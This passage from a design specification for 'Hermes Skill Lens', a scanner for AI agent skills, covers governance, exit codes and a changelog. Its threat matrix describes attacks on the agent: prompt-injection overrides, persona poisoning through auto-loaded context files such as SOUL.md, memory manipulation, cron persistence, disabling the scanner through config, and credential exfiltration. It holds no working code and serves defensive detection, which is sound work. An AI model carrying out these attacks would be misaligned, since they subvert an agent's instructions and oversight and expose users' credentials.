- **Community packs**: opt-in, pinned version + SHA256; namespaced IDs (`community/<pack>/LNS-…`); capped at MEDIUM severity in street until promoted after two release cycles of field history.
- **Origin attribution**: patterns studied from external scanners (in-tree guard regexes, SkillEvaluator wrapper) enter only via attributed transcription/adaptation (`origin: adapted-from <repo@sha>`, each port passing the benign-corpus promotion gate) — never wholesale import; `origin:` fields render in `explain-rules` rule cards (O1 hybrid / R7 non-coupling).
- **Ownership**: CODEOWNERS per threat category; security-sensitive categories (integrity.override, secrets.exfil, persona.write) require two-maintainer review.
- **Deprecation UX**: deprecated rules annotate in `explain-rules` with removal version.

---

## 16. Personality & fun (opt-in only; default stays sober)

Guardrails (binding): fun lives behind flags/themes; themes change prose and visuals **never** findings, severities, grades, verdicts, or JSON; no date/environment-triggered surprises; laugh at the codebase-as-patient never the developer; motion
requires interactive TTY + explicit opt-in; respect `NO_COLOR`/`--plain`; **automation surfaces permanently sober** (one-liners, JSON, SARIF, events.ndjson, transform-lane appends).

New axis the plugin frame adds: slash output **enters the conversation as context the model conditions on**, possibly relayed to Discord/mobile. Consequences: (a) tone bleed is a real failure mode, so the default register is dry understatement
(clinical/microscopy); camp is the highest-bleed prose we could ship and stays deferred (O4); (b) animated/file-shaped features need string/path fallbacks on return-str surfaces.

Ranked build list:

1. **Share cards — CUT** by owner arbitration (HQ O3): exportable scan artifacts are an overfeature; nothing poster-shaped ships in any version.
2. **Autopsy voices** — `clinical` (default), `microscopy` (dry dictation; understatement is the joke) in v1; `noir` stays deferred usage-gated per O4's tone-bleed rationale. Prose-only; golden test verifies identical finding IDs/severities across
voices (data-invariance); snapshot tests catch register drift.
3. **`lens bones`** — module tree as anatomical chart; `/lens bones` returns fenced art (≤1900) that renders perfectly in chat. Self-contained gag.
4. **`lens lens`** — Skill Lens scans its own repo; dogfooding gag doubling as CI gate.
5. **Watch pulse / optical sweep** — TTY-only animations (`--animate`), ≤10 fps, skippable; silently inert on return-str surfaces and pipes.
6. **Playground patient** — `playground` copies the canary fixture repo; `/lens playground` returns copy instructions.
7. **Canary lore** — documented fixture skill for tutorials/self-tests; lore lives in docs, not UX.

Rejected by guardrails: mascots, date pranks, joke exit codes, themed default reports, renaming.

---

## 17. Threat model coverage matrix (rev 2 — Hermes-precedent column)

Ground truth anchoring this section: the agent's self-state is plain files under `$HERMES_HOME`; context files (`SOUL.md`, `.hermes.md`, `AGENTS.md`, `CLAUDE.md`, `.cursorrules`) are auto-injected into the system prompt; `metadata.hermes` fields are
attacker-writable and host-consumed; `cron/jobs.json` is arbitrary-agent-run-as-schedule in JSON; gateway routing is source-addressed across isolated profile homes sharing `$HERMES_HOME/.env`.

Legend: ● primary detection, ○ contributing signal, – not covered in v0.9 (residual noted). R1–R12 carried from rev 1; H1–H9 are the Hermes-precedent rows.

| ID | Threat (precedent) | E1 | E2 | E3 | E4 | E5 | E6 | E7 | E8 | Capabilities | Residual risk | Hermes precedent |
| --- | --- | - | - | - | - | - | - | - | - | --- | --- | --- |
| R1 | Hidden Unicode instructions (Tags/zero-width) | – | ● | ○ | ○ | ○ | ○ | – | – | obfuscation | novel encodings; ghost-text narrows | unchanged |
| R2 | Prompt injection overriding agent | ○ | ● | ○ | ○ | ○ | – | – | – | integrity.override | semantic subtlety; MED cap uncorroborated | unchanged |
| R3 | Credential harvest + dead-drop exfil (AMOS) | – | ○ | ● | ● | ● | ● | ● | – | secrets.exfil, credentials.read, network.send | custom protocols | unchanged |
| R4 | Reverse shell / RCE dropper (clawdhub) | – | ○ | ● | ● | ● | ○ | – | – | execute.shell/code, network.send | staged loaders (v1.0 taint helps) | unchanged |
| R5 | Permission-bypass frontmatter (HiddenLayer) | ● | – | – | – | – | – | – | – | integrity.override | new vendor fields | unchanged |
| R6 | Hidden/auto-trigger persistence | ● | ○ | ● | ● | ● | – | – | – | persistence | OS-level persistence outside bundle | unchanged |
| R7 | Obfuscated payloads | – | ● | ● | ● | ● | ○ | ○ | – | obfuscation | decode-depth cap 3 | unchanged |
| R8 | Malicious dependency | – | – | ○ | ○ | ○ | – | – | ● | supply-chain | offline heuristic; `--osv` closes opt-in | unchanged |
| R9 | Secrets committed in bundle | – | ○ | ○ | ○ | ○ | – | ● | – | credentials.read | high-entropy non-key blobs | unchanged |
| R10 | Deceptive description vs behavior | ○ | ○ | – | – | – | – | – | – | overreach (claimed-vs-actual) | ambiguous copy → needs_review | unchanged |
| R11 | Data destruction / sabotage | – | – | ● | ● | ● | – | – | – | filesystem.outside | intent ambiguity; declared-discount applies | unchanged |
| R12 | Scanner evasion (split signals) | – | – | – | – | – | ○ | – | – | (dedup keeps evidence) | v1.0 taint work | unchanged |
| H1 | **Persona poisoning** (SOUL.md/context files) | ○† | ● | ● | ● | ● | – | – | – | persona.write*, integrity.override | runtime-generated content | SOUL.md auto-loaded as identity every boot; any file-tool skill can rewrite it; survives skill removal |
| H2 | **Memory manipulation** (MEMORY.md/USER.md/memories/) | – | ● | ● | ● | ● | – | – | – | persona.write*:memory | lexical link-gaming | memories/ prompt-injected each session; learning-graph links memory↔skill |
| H3 | **Skill→skill chaining / dropper** (related_skills) | ●† | ○ | ● | ● | ● | ○ | – | – | spawn.agent*, integrity.override | cross-bundle payload unseen | related_skills host-consumed; skills/** writable; installer surfaces callable |
| H4 | **metadata.hermes abuse** (tag spoof, fallback grooming, config keys, unknown fields) | ●† | ○ | – | – | – | – | – | – | integrity.override (deceptive_metadata) | future unknown fields | tags/requires/fallback/config consumed by host logic; config entries write config.yaml keys at install |
| H5 | **platform_disabled / config tampering** | – | ○ | ● | ● | ● | – | – | – | integrity.override:control_plane | none major | per-platform disabled view lives in plain YAML; includes disabling Skill Lens itself |
| H6 | **Agent-cron persistence** (jobs.json) | ○ | ○ | ● | ● | ● | – | – | – | persistence:cron_json | Chronos re-arm survives restart | jobs.json = prompt+script+schedule+deliver; one JSON write = recurring agent execution |
| H7 | **Channel social engineering** | – | ● | ● | ● | ● | ○ | – | – | network.send:messaging_human | runtime-composed lures | discord/telegram/feishu/slack adapters; channel_directory.json enumeration; cron deliver-to-origin bait |
| H8 | **Profile escape / cross-tenant read** | – | ○ | ● | ● | ● | – | – | – | filesystem.outside, filesystem.read:cross_profile, credentials.read | runtime-context dependent; enforcement is host-side | profile_routes multiplexing; isolated profile homes share $HERMES_HOME/.env + auth.json |
| H9 | **$HERMES_HOME path indirection** (enabling primitive) | ○ | – | ●‡ | ●‡ | ●‡ | – | – | – | (enables H1/H2/H5/H6/H8) | exotic variable forms | ${HERMES_HOME:-~/.hermes} idiom in shipped skills; .env holds live provider tokens |

† served by E1 Hermes-dialect core data (§4). ‡ consumes the ingest normalization primitive (§5.1).

**Detection shapes & calibration.** H1/H2: normalized-path sink rules (0.85–0.95 ast/crossref) + prose directives (≤0.55 static unless corroborated); H3: manifest chain-reference (presence- factual, LOW alone) + skill-tree/installer sinks (HIGH
undeclared); H4: five structural E1 rules, LOW–MED; H5: config-write sinks with content-shape escalation (`platform_disabled` token in the same payload ⇒ toward CRITICAL — no benign authoring story); H6: cron-dir writes > scheduler-API calls > prose,
payload-marker escalation (credential/network tokens in prompt/script fields); H7: gateway-state access + outbound-instruction grammars + messaging claims, severity keyed on enumeration/broadcast breadth vs single-target notification; H8:
cross-profile paths requiring co-present profile-awareness tokens; H9: the primitive itself. FP-risk ranking (highest first): H2 memory journaling > H4 tag heuristics > H7 notifications > H1 persona tooling — mitigated by extended declared-discount
eligibility (§8.2) and §15 negative fixtures.

**Residual risks accepted for v0.9** (each gets an accepted-risk changelog note): runtime-composed lure content (H7); cross-bundle chain completion (H3 — watch/diff narrows, doesn't close); exotic path-variable tails (H9); profile-boundary
enforcement (H8 — host concern; Skill Lens detects intent-shaped evidence only). Conversation-mediated exfil with runtime-generated content is invisible to static analysis generally; watch-mode behavioral deltas and messaging-heavy manifest marking
partially mitigate. Matrix reviewed each rule-pack minor release; uncovered cells need a roadmap entry or an explicit accepted-risk note.

---

## 18. Exit-code contract (normative — **CLI verbs only**)

| Code | Meaning | Emitted when |
| --- | --- | --- |
| 0 | Completed; no threshold breach | Default CLI scans (advisor stance), `doctor`, `watch`, `map`, `diff` success |
| 1 | Threshold breach | Only with explicit `--fail-on LEVEL` and verdict ≥ level |
| 2 | Total error | Unreadable target/config, rule-pack checksum failure, orchestrator fault. **Never** for engine crashes (those are findings, D-CRASH) |

**Scope statement.** These codes exist on CLI verbs (`hermes lens …`) and the future standalone console script. Slash commands return strings; hook callbacks' returns are discarded — there is nowhere to deliver an exit code, by host design.
Therefore: the **verdict field (plus `needs_review`) is THE automation interface on every surface** — CI gates via `--fail-on`/JSON/SARIF today, the GitHub Action (v1.0) gates on verdict, in-session the agent reads verdict from the report or
one-liner. Errors in-session are structured diagnostics degraded to one-line notices — never raised into the host; "exit 2" moments render with the **same wording** as CLI stderr (mockup D) so logs stay greppable across surfaces. Do not invent
slash-command error sentinels; strings and verdicts suffice. Hook callbacks always behave success-shaped toward the host (observer contract: the host catches and logs exceptions anyway; Skill Lens raises nothing).

**Doctor exit semantics:** CLI `lens doctor` exits 0 with warnings (§11.9) and **2 on any hard check failure** (unreadable rule pack, failed wiring audit, failed isolation self-test) — total-error semantics; `/lens doctor` renders the same verdict line in-session and never raises.

---

## Appendix A — change log (v0.3 → v0.9.0 "Hermes-native overhaul")

*Items 1–15 summarize the 2026-08-22 draft (historical; retired-analysis references retained for continuity). Items 16–32 record the Hermes-native overhaul decided by the 2026-08-23 reversal audit. Item 33 records the owner rename of the same date. Items 34–35 record the owner doctrine pass and open-question sweep; item 36 records the completed owner arbitration pass of 2026-08-23.*

1. Scoring v2: diminishing weights, declaration/static discounts, tier caps, disqualifying ceilings replace flat subtraction; fixes lab/exfil inversion (§8).
2. Suspected-critical handling: conf<0.6 ⇒ 40-ceiling + needs_review replaces penalty halving.
3. Money/override double-count resolved via tier penalties + ceilings (D-MONEYCAP).
4. Language locked: Python 3.11+ native Hermes plugin (rev. 2 of D-LANG; original compiled-core call superseded and retired unless a v1.x standalone CLI materializes).
5. Tree-sitter grammars targeted for v0.9 via official bindings (delivery story repaired in #24).
6. Hooks finalized as Hermes-native observers with fast-path/worker-thread budgets; watch = hash-poll for out-of-band drift.
7. Choir bound to downgrade-only (Cisco #138 lesson).
8. Baselines with mandatory expiring reasons; fingerprints location-stable.
9. Street/lab split with mandatory downgrade annotations.
10. Rule-pack governance formalized: golden TP+FP fixtures required; community packs pinned+capped.
11. Privacy guarantees made test-enforced.
12. Exit-code contract normative; `--fail-on` default none preserves advisor stance.
13. Money engine folded into E6 host classes + E3–E5 payment sinks; `surveillance` emitter added; undeclared-money ceiling reachable.
14. Choir disposition fixed: contract stub v0.9; upstream adapters v1.1; LLM adjudicator post-1.0 pending promotion eval. *(Owner arbitration: adjudicator promotion eval moved up to v1.0 — see §13.)*
15. Hermes-first reframe adopted (owner decision): pure-Python Hermes plugin; cross-agent parity dropped; ports deferred.
16. **Reversal audit executed** (2026-08-23): platform dossier, decision-reversal audit, threat-surface analysis, UX design pass grounded in Hermes 0.20.5 source (`.analysis/`). Tally: 29 STANDS · 9 STRENGTHENS · 2 WEAKENS (repaired) · **0 FLIPS** ·
2 ANSWERS-ITSELF (implemented as D-PROV/S7 and D-SURF/X2).
17. **Trigger architecture centered** on `on_skill_lifecycle` + `post_tool_call(skill_manage)` + hub-quarantine watcher; `pre_tool_call` refusal made doctor-verifiable against `VALID_HOOKS`; agent-created gap named as Skill Lens's unique beat
(`guard_agent_created` defaults off).
18. **`/lens` slash promoted to first-class surface**: shared argparse spec with CLI verbs, surface-neutral output contract (no ANSI, fenced blocks, 1200/1800-char budgets, spoilers opt-in), collapsed-by-default rendering, coverage footer on all
renders.
19. **Async job model specified**: `queued→scanning→ready|failed` in jobs.json, events.ndjson ledger, bundle-hash coalescing, per-surface delivery table; gateway push documented-unavailable in v0.9 (no public push API).
20. **Plugin-settings policy layer** inserted into resolution order (`plugins.entries.lens.settings.*` via `ctx.get_config`), with provenance-string support in `explain-rules`.
21. **Hermes-dialect ingest specified**: categorized layout targets, `metadata.hermes` validation, hub-lockfile provenance enrichment at scan time (hook kwargs carry bounded classes only), and the `$HERMES_HOME` path-normalization primitive
(`inside_skill_root | agent_home:<sub> | outside`) — blocking prerequisite for the entire Hermes-state rule family.
22. **E1 upgraded; choir.harness dissolved**: Hermes frontmatter grammar promoted into core manifest-engine data (unknown-field firing, category-vs-directory, related_skills resolution, tag-spoof/fallback-grooming/config-key rules).
23. **Capability ontology extended**: `persona.write` + `spawn.agent` added; `persistence` extended to agent-native schedulers; sub-tags `control_plane`, `messaging_human`, `cross_profile` added; lexicon gains scheduling/messaging/persona verb
families.
24. **D-PARSE delivery story repaired** (audit WEAKENS): declared `python_dependencies` + doctor active/degraded check + golden-tested line-scanner fallback as first-class; AST demotion to v1.0 retained as last resort; old compiled-artifact rationale
retired.
25. **Containment honesty** (D-PROC/D-CRASH caveat): exception isolation ≠ memory isolation; grammar-input fuzzing normative; doctor crash-loop check (#8); subprocess parse-isolation recorded as v1.0 escape hatch.
26. **Threat matrix rev 2 shipped**: nine Hermes-precedent rows (H1–H9) with precedents cited; ~27–30 new rules budgeted within the ~40-rule pack; calibration defaults, FP-risk ranking, and residual accepted risks recorded.
27. **Exit codes scoped to CLI verbs; verdict elevated** (answers-itself X2): verdict + `needs_review` are THE automation interface; in-session errors render as same-wording notices; no slash error sentinels invented.
28. **Provenance annotation ruling** (answers-itself S7): hub trust levels render on the patient line and store in IR but never modify weights/discounts/ceilings — compromised trusted repos scan loud. Third implicit "trusted ⇒ softer" profile
expressly rejected.
29. **Quarantine beat elevated to co-flagship** (audit S8) with integrated third-opinion display (guard gate / SkillEvaluator advisory / Skill Lens depth, role-labeled) and hard non-coupling rules (no INSTALL_POLICY access, no guard-regex imports,
render-time dedupe only).
30. **Privacy restated for in-process reality** (R2/T4): G1/G3 enforcement becomes pytest-socket + import-contract tests; guarantee narrowed honestly to zero *direct* egress; v1.0-committed `ctx.llm` narrator designed (consent-gated, redacted, `llm_touched`,
outside canonical envelope, downgrade-only) and parked in roadmap; G6 gains hub-scan-cache coexistence + per-profile scoping tenants.
31. **Advocacy channel found** (R4): claim-vocabulary proposals *could* publish through Hermes's own standards machinery (`metadata.hermes` namespace tolerance, advisory skill linter, authoring skill) — shaping the ecosystem at near-zero focus cost while
external neutrality ("we publish, hosts adopt") stays intact. **Superseded by owner arbitration: advocacy rejected outright** — the vocabulary is a Hermes feature request, not a Lens feature; Lens does no advocacy of any kind in any release (HQ R4).
32. **Voice posture** (O4): clinical default + microscopy alternate in v1; noir deferred usage-gated — tone-bleed into model context named as the plugin-frame-specific reason; snapshot tests from day one.
33. **Owner rename** (2026-08-23): Skill X-Ray → Hermes Skill Lens; commands/rule-prefix/config namespaces per map; metaphor migrates radiology→optics; codenames → optics pioneers.
34. **Owner doctrine pass** (post-rename): three-pillar product doctrine + Surface Principle codified (§1); **`/lens explain --llm` narrator cut outright** — Lens generates no model prose in any version, explanation belongs to the consuming agent; model access narrowed to `/lens second-opinion` alone (downgrade-only, opt-in), promotion eval moved up to v1.0; O2 collapsed-stat rendering confirmed as owner answer.
35. **Open-question arbitration sweep**: O1 hybrid provenance confirmed; O3 share cards rejected outright (overfeature — all card surfaces/flags/settings removed); O4 clinical+microscopy confirmed, noir stays usage-gated; O5 corpus publishes full fidelity publicly, publication risk accepted by owner (stub/parity machinery dropped).
36. **Owner arbitration pass completed** (2026-08-23; HARD_QUESTIONS rev. 3 — all thirteen dispositions arbitrated, propagation ledger `.analysis/06_owner_decisions.md` applied): **share cards rejected outright** — every card surface, flag, theme, and setting removed from all releases; retained only as archived heritage and cut markers (§12.5, §16; O3); **fixture corpus adopts public full-fidelity publication**, stub/private split and parity-invariant machinery dropped, licensing/provenance review gate retained (O5); **Surface Principle codified in §1** with the collapsed worst-5 slash default pinned for golden tests (O2, §11.3); **advocacy rejected outright in every release** — no roadmap item, revisit date, or trigger condition (R4); `--llm` narrator cut, `/lens second-opinion` sole model access ever (R2); voice pack locked to clinical+microscopy, noir usage-gated (O4); rule-pack provenance hybrid confirmed — attributed ports tagged `origin: adapted-from <repo@sha>`, rendering in rule cards (O1, §15); coverage-honesty footer materialized byte-stable on every report surface including slash renders, fast-path one-liners exempt (R5, §12.6); brand Hermes Skill Lens / display Skill Lens (R6); hub trust annotation-only (R8); skills_guard integrated display with strict non-coupling (R7); pure-Python host-native delivery (R1); user-authored `re:` allowlists stay deferred to v1.1 (R3). Legacy Q-number citations retired to R/O labels throughout.
